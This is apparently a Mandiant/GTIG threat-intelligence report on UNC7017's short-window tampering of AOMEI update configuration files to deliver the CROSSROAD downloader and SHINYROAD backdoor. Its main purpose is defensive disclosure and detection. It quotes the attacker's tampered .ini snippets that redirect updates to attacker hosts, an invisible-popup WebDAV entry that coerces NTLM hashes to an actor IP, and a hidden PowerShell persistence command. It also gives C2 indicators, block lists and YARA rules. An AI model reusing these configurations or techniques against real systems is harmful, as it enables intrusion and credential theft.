---
title: Investigating Ephemeral Supply Chain Tampering | Google Cloud Blog
author: Mandiant; Google Threat Intelligence Group
url: https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering
hostname: google.com
description: GTIG and Mandiant uncovered a supply chain attack targeting AOMEI Technology's update infrastructure, where attackers used short-burst configuration tampering on origin servers to deploy tools like the SHINYROAD trojan.
sitename: Google Cloud Blog
date: "2026-10-16"
tags: ['Threat Intelligence']
fingerprint: "3458ac5b877f12d0"
---
# Investigating Ephemeral Supply Chain Tampering

##### Mandiant

##### Google Threat Intelligence Group

##### Google Threat Intelligence

Visibility and context on the threats that matter most.

[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)

Written by: Tyler McLellan

### Introduction

Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning.

The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017.

Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified.

This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. METAL’s analysis of this campaign is available in their [blog](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html).

### How AOMEI Update and Notification Systems Work

AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services (`Backupper.exe` and `ABNotify.exe`) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups:

Figure 1: AOMEI Update Mechanism

1. **Update Configuration** (`down_html.ini`): The software periodically sends an HTTPS request to `https://www2.aomeisoftware.com/download/abpopup/down_html.ini`. This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download `upgrade-now.zip`.
2. Notification Configuration (`Notifycfg.ini`): The software contacts `https://account.aomeitech.com/Notifycfg.ini`. This file instructs the local notification process (`ABNotify.exe`) what messages to display and specifies commands or programs located in the software’s local directory to execute.

Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain (`www2.aomeisoftware.com`).

### Campaign Overview

Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files.

During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware.

In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control.

#### Short Burst Supply Chain Tampering

A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers:

- May 28: 10-minute exposure window (05:40 – 05:50 UTC)
- July 16: 6-minute exposure window (08:33 – 08:39 UTC)
- July 20: 5-minute exposure window (10:35 – 10:40 UTC)

At the conclusion of each window, UNC7017 reverted both down\_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes.

#### Weaponizing Native Update Logic: down\_html.ini and Configuration Bloat

To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down\_html.ini and Notifycfg.ini.

To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down\_html.ini during each tampering window:

```
[Date]
-Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip
+Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
-thrid=5
+thrid=6
[MD5]
-Val=EE89C99F3753231771170F5D9CBBAE1E
+Val=31323E7E738230FA6A8DEEF2B7894666
```
Figure 2: July 16 tampering of down\_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash.

During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named \[dummy\_XXXXXX\]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory.

#### Infrastructure Shifts

Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic.

#### Infrastructure Shifts

1. **Early Cloud Staging (April–May 2026):** Early CROSSROAD payloads (`upgrade-now.exe` observed May 20) relied on Alibaba Cloud Object Storage (`serv.oss-cn-hongkong.aliyuncs.com`).
2. **Dedicated Domain Infrastructure (July 1–7, 2026):** The threat actor transitioned to dedicated, vendor-themed domains (`storage-data.com`, `promotion.storage-data.com`, `aomei.storage-data.com`).
3. **Hybrid Cloud Delivery Split (July 20, 2026):** During the 5-minute window on July 20, the threat actor modified `down_html.ini` to direct initial client downloads to a public Google Cloud Storage bucket (`storage.googleapis.com/aomeiupdate/upgrade-now.zip`) rather than `storage-data.com`. This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage `storage-data.com` for secondary payload retrieval and C2 communications.

```
[Date]
Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
thrid=7
[MD5]
Val=BF73C4391B58CA95220CE3AE03F66DCF
```
Figure 3: July 20 modification of down\_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks.

### WebDAV NTLM Credential Coercion

On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path:

```
[PopWindow1]
ID=307
Title=20260408-AB Flash Sale (All Lang 不含EN)
Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```
Figure 4: Malicious `Notifycfg.ini` configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to `8.210.84.56`.


By forcing the AOMEI client to request a remote `file://` resource via WebDAV (`DavWWWRoot`), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address (`8.210.84.56`) without user visibility.

#### Malware Delivery & Post-Exploitation Tooling

Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks:

- **Defense Evasion via Timestomping:** Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis.
- **Modified Radmin Server Backdoor:** During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access.
- **Adaptix C2 Integration:** Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure.

#### The Primary Downloader: CROSSROAD

The primary Stage-2 downloader (`upgrade-now.exe`, SHA256: `9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450`) is a 64-bit Windows executable written in C, tracked by GTIG as the **CROSSROAD** malware family. Delivered inside `upgrade-now.zip`, CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite.

- **Path Verification:** As part of its configuration routine, CROSSROAD checks whether its file path contains the substring `AOMEI`. If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless.
- **Execution Guardrails:** Before proceeding with secondary downloads, CROSSROAD enforces two primary checks:
- **Geolocation Check:** Queries external domain name system (DNS) (`myip.opendns.com`, `o-o.myaddr.l.google.com`) and HTTP reflection services (`checkip.amazonaws.com`, `api.ipify.org`, `ifconfig.me/ip`, `icanhazip.com`) using custom User-Agents (`Anyviewer-loader/1.0`, `Anyviewer-ipcheck/1.0`). In specific execution branches, if the returned country code is `"CN"` (China), the loader aborts its primary payload execution path.
- **Lock Mutex:** Acquires the named mutex `Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}` to prevent multiple concurrent instances on the same host.
- **Host Artifact Reversion & Anti-Forensics:** To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses `down_html.ini` (located at `<install_dir>\..\..\`), restoring the update thread parameter (`thrid`) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure (`https://www2.aomeisoftware.com/download/abpopup/`).
- Stage-3 Payload Staging & Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc\<random\_hex>.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library.
- **Persistence via Scheduled Task:** To ensure continuous execution of the staged payload bundle, `upgrade-now.exe` registers a persistent scheduled task named `RadminComponentRuntime` (configured with the description”Radmin Component runtime checkable.”). The task is set to execute `%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk` every three hours.
- **Self-Deletion (--nitrod):** After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the `--nitrod` parameter, passing its parent PID via `NITRODP` and original executable path via `NITRODT`. The child process waits for the parent to terminate, renames the original binary's primary `:$DATA` stream to an alternate data stream named `:wtfbbq` via `SetFileInformationByHandle`, and flags `FileDispositionInfo` with `DeleteFile = TRUE` to unlink the binary on handle close.
- **Version Information:** The executable contained standard PE version metadata with a notable typo string: `"ProductName: AOMEI Update Compent"`.

Figure 5: Victim Profiling, Malware Delivery Logic

#### Stage-3 Payload: SHINYROAD and Radmin Suite

The payload archive unpacked into `%LOCALAPPDATA%\Radmin\` by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the **SHINYROAD** modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution.

- **Execution via DLL Search-Order Hijacking (BlkScrDl.dll):** Execution begins when the persistent `RadminComponentRuntime` scheduled task launches the legitimate, signed Radmin binary `%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk` (or `FamItrf2.exe`). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, `BlkScrDl.dll`, via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library.
- **Shared Memory & In-Process COM Server Staging:** Upon execution, `BlkScrDl.dll` locates `config.zip` in its execution directory, maps its raw contents into a shared memory section named `Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf`, and dynamically registers `csvc\RuntimeComponent.dll` as an in-process COM Server under CLSID `{21191641-0D7F-4CD9-9572-01AAE6E7851B}` and AppID `{9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}`.
- **COM-Triggered Stage-2 Initialization & Embedded PocketPy VM:** When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads `config.zip` directly from shared memory, extracts the encrypted payload `metadata.dat`, and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which `RuntimeComponent.dll` executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to `8.218.65.184:443`.

#### Evolution of the SHINYROAD Architecture

Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (\_pyio\_compat, \_pyio\_struct, and pkpy) to avoid loading standard Python libraries on disk:

- **Custom Binary C2 Protocol**: Earlier variants communicated over raw TCP (`8.218.65.184:41397`). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID.
- **In-Memory Capabilities**: The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the `pkpy` WorkPool thread manager without writing script modules to disk.

#### Post-Exploitation: Nitro PDF Theme & Adaptix C2

In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools (`NitroPromotion.exe`):

- **Persistence:** The malware installed a scheduled task named `\NitroRuntime` that executed:

`powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden"`
Figure 6: NitroRuntime scheduled task persistence

- **Adaptix C2 Beaconing**: The executable sideloaded `Eztwain4.dll` (ADAPTAGENT) from `%LOCALAPPDATA%\Nitro Pro\`, which established periodic 2-minute beacons to `8.210.84.56:6800`.

### Outlook and Implications

This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., [SolarWinds](https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor), [3CX](https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise)). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis.

UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative:

1. **Anti-Analysis by Design:** By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files.
2. **Selective Exploitation**: Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure.
3. **Dual-Pronged Approach**: Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked.
4. **Co-opting Commercial Software**: Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules.

### Remediation and Hardening

Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published [Mitigation Guidance for Supply Chain Compromise](https://cloud.google.com/blog/topics/threat-intelligence/mitigation-guidance-for-supply-chain-compromise).

#### Vendor Notification & Architecture Hardening

On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken.

#### Why Server-Side Remediation Does Not Disinfect Endpoints

Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed.

- **Persistent Resident Payloads**: Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers.
- **Obscured Root Cause**: While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification.
- **Hunting Imperative**: Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post.

#### Guidance for Software Vendors & Developers

Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls:

- **End-to-End Cryptographic Signature Verification**: Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file).
- **Cryptographically Signed Configuration Files**: Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration.
- **Domain Allowlisting and Destination Pinning**: Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets.
- **Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers**: Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols (`https://`) and explicitly disallow local file (`file://`) and UNC WebDAV schemes to prevent external NTLM credential coercion.
- **Decoupling Core Updates from Marketing Channels**: Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution.
- **Origin Integrity Monitoring and Access Controls**: Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes.

#### Guidance for Security Operations (SOC) & Incident Responders

#### Overcoming the "Point-in-Time" Triage Pitfall

The short-burst nature of this attack creates a unique challenge for incident response:

- **The Triage Trap**: When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive.
- **Actionable IR Protocol**: Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in `%PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\` and review proxy/firewall telemetry corresponding to the precise second the alert was triggered.

#### Camouflaged Follow-on Activity

The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering.

#### Endpoint and Network Hardening Actions

#### Endpoint File Checks

Inspect systems for the following directories and artifacts. Defenders must distinguish between malicious payloads and legitimate signed binaries abused for search-order hijacking:

Table 1: Endpoint file checks

#### Scheduled Tasks and Registry

- **Scheduled Tasks:** Check for unauthorized tasks named `\NitroRuntime` or `\RadminComponentRuntime`.
- **Registry:** Check `\REGISTRY\MACHINE\SYSTEM\Software\Microsoft\TIP\AggregateResults\data` for unusual binary blobs.

#### Network Defenses

- Block outbound network connections to `promotion.storage-data.com`, `aomei.storage-data.com`, `storage-data.com`, `8.210.84.56`, `47.239.60.117`, and `8.218.65.184`.
- Block outbound SMB (TCP 445) and WebDAV traffic to external IP addresses to prevent NTLM credential coercion.
- Inspect proxy and web gateway logs for the User-Agent `Anyviewer-loader/1.0` or requests to Alibaba Cloud OSS endpoint `serv.oss-cn-hongkong.aliyuncs.com`.

### Indicators of Compromise (IOCs)

To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a [GTI Collection](https://www.virustotal.com/gui/collection/dcba624e1f934c2dc047f12161f51397b1603610f7d7a15069c38f0c5bd9e09f) for registered users.

#### Malicious File Hashes (SHA-256)

Table 2: Malicious File Indicators

#### Legitimate File Hashes (SHA-256)

Table 3: Legitimate File Indicators

#### Configuration File Hashes (AOMEI `.ini`)

Table 4: Configuration Files

#### Network Indicators

Table 5: Network Indicators

#### Mutexes & Scheduled Tasks

- **Mutex:** `Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}`
- **Shared memory mapping:** `Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf`
- **Scheduled Task:** `\RadminComponentRuntime`

### Google Security Operations (SecOps)

Google Security Operations customers have access to these broad category rules and more under the "Mandiant Frontline Threats", “Mandiant Hunting Rules”, and "Applied Threat Intelligence - Curated Prioritization" rule packs. The activity discussed in the blog post is detected in Google Security Operations under the rule names:

- Explorer Launching Cmd With Powershell Start Process Command
- Suspicious Process Invoking Dllhost Clsid Invocation
- ATI Active Breach Rule Match for File IoCs
- ATI High Priority Rule Match for Ip Address IoCs
- ATI Medium Priority Rule Match for Ip Address IoCs
- Copy System Binary
- System32 Binary Copied to Non-Standard Directory

### Detections

#### YARA Rules

```
rule G_APT_Downloader_CROSSROAD_1
{
	meta:
		author = "Mandiant"
		desc = "Detects obfuscated and masquerading UNC7017 CROSSROAD downloaders targeting AOMEI software update mechanisms"
		
	strings:
		// Masquerading & Metadata
		$meta_typo = "AOMEI Update Compent" wide
		$meta_co = "AOMEI International Network Limited" wide
		$meta_ver = "8.2.5.0" wide
		$meta_orig = "upgrade-now.exe" wide
		$meta_name = "upgrade-now" wide
		// Embedded Decompression & Downloader Artifacts
		$miniz1 = "archive is too large" ascii
		$miniz2 = "failed finding central directory" ascii
		$miniz3 = "unexpected decompressed size" ascii
		$whttp1 = "WinHttpCrackUrl" ascii
		$whttp2 = "WinHttpSendRequest" ascii
		// Obfuscation & Scheduled Task Artifacts
		$task1 = "RadminComponentRuntime" wide
		$task2 = "Radmin Component runtime checkable." wide
		$flag = "--runtimechk" wide
		$sob1 = "IsCurrentIpWhitelisted._sob_enc" ascii
		$sob2 = "DownloadFileFromUrlA._sob_enc" ascii
		$sob3 = "WinMain._sob_enc." ascii
		$obf_key = "_sob_key" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 5MB and (
			(($meta_typo or ($meta_co and ($meta_orig or $meta_name or $meta_ver))) and
			 any of ($miniz*) and
			 any of ($whttp*)) or
			(2 of ($sob*) and ($task1 or $flag)) or
			($obf_key and $task1 and $task2 and any of ($sob*))
		)
}
```
```
rule G_APT_Backdoor_SHINYROAD_1
{
	meta:
		author = "Mandiant"
		desc = "Detects the SHINYROAD BlkScrDl.dll COM-staging loader and RuntimeComponent.dll PocketPy engine"
		
	strings:
		// Shared SHINYROAD artifacts (shared memory section and mutex)
		$shm = "Local\\963d3c60-d406-4ad6-aa1e-dc8e45061ccf" ascii wide
		$mtx = "Global\\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}" ascii wide
		// BlkScrDl.dll loader: config.zip staging and COM server registration
		$ld1 = "%sconfig.zip" ascii
		$ld2 = "%scsvc\\RuntimeComponent.dll" ascii
		$ld3 = "libBlkScrDl.dll" ascii
		$com1 = "Software\\Classes\\CLSID\\%s" ascii
		$com2 = "Software\\Classes\\AppID\\%s" ascii
		$com3 = "%s\\InprocServer32" ascii
		// RuntimeComponent.dll embedded PocketPy engine
		$rc1 = "libRuntimeComponent.dll" ascii
		$rc2 = "metadata.dat" ascii
		$rc3 = "_pyio_compat" ascii
		$rc4 = "_pyio_struct" ascii
		$rc5 = "%sdemo_srv.log" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 5MB and (
			($shm and $mtx) or
			(($shm or $mtx) and (2 of ($ld*) or 2 of ($rc*))) or
			(2 of ($ld*) and 2 of ($com*)) or
			($rc1 and $rc2 and any of ($rc3, $rc4, $rc5))
		)
}
```
```
rule G_APT_Backdoor_SHINYROAD_2
{
	meta:
		author = "Mandiant"
		desc = "Detects compiled PocketPy bytecode payloads associated with SHINYROAD backdoors"
	strings:
		$pkpy_magic = { 4F 43 01 00 }
		$proto1 = "mct3-handshake-v1" ascii
		$script = "bootstrap_tcp_slim_v2_call_min.py" ascii
		$jam1 = "JAM_BURST_PACKETS_MIN" ascii
		$jam2 = "JAM_MIN_MS" ascii
		$jam3 = "JAM_MAX_BYTES" ascii
		$mod1 = "_pyio_struct" ascii
		$mod2 = "_pyio_compat" ascii
		$enc1 = "nh_enc" ascii
		$enc2 = "encbody" ascii
	condition:
		$pkpy_magic at 0 and filesize < 500KB and (
			$proto1 or
			$script or
			all of ($jam*) or
			(all of ($mod*) and any of ($enc*))
		)
}
```
```
rule G_APT_Launcher_ADAPTAGENT_1
{
	meta:
		author = "Mandiant"
		desc = "Detects UNC7017 ADAPTAGENT post-exploitation loader and sideloaded Adaptix payload (Nitro camouflage)"
		ref = "https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering"
		platforms = "Win"
		rs1 = "14b31918075e6130b9123158743db0a81e2d7bfcf6d39731ee7d9200a98cd591"
	strings:
		// Sideloaded Masquerading & Camouflage
		$camo_exe1 = "NitroPromotion.exe" ascii wide nocase
		$camo_exe2 = "Nitro_Scan2PDFApp.exe" ascii wide nocase
		$camo_dll1 = "Eztwain4.dll" ascii wide nocase
		$camo_dll2 = "Nitro PDF Eztwain4" ascii wide nocase
		$camo_ver = "14.10.1.0" ascii wide
		$camo_copy = "Nitro Software, Inc." ascii wide
		// NitroPromotion Loader & Staging Functionality
		$load1 = "DownloadToLocalAppData" ascii
		$load2 = "ExtractZipToDirectoryA" ascii
		$load3 = "GetTempZipFileNameA" ascii
		$load4 = "CreateScheduledTask" ascii
		// Adaptix C2 & ADAPTAGENT Core Artifacts
		$adapt1 = "Adaptix Crash Analyzer v1.0" ascii
		$adapt2 = "Global\\{8d00c640-48d8-4440-a8e1-660fd37f572a}" ascii wide
		$adapt3 = "\\\\.\\pipe\\%08lx" ascii
		$adapt4 = "13ConnectorHTTP" ascii
		$adapt5 = "9Connector" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 10MB and (
			// Branch 1: ADAPTAGENT Sideloaded Payload (Eztwain4.dll)
			(any of ($camo_dll*, $adapt1, $adapt2) and 2 of ($adapt*)) or
			// Branch 2: NitroPromotion Masquerading Loader (NitroPromotion.exe)
			(any of ($camo_exe*) and (2 of ($load*) or any of ($adapt1, $adapt2))) or
			(all of ($camo_ver, $camo_copy) and any of ($camo_exe*) and any of ($load*))
		)
}
```
### MITRE ATT&CK Techniques

Table 6: MITRE ATT&CK techniques

### Acknowledgements

GTIG and Mandiant would like to thank the ManageEngine Threat Analysis Lab ([METAL](https://www.manageengine.com/threat-analysis-lab)) research team for their initial discovery of this activity, proactive telemetry sharing, and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem.
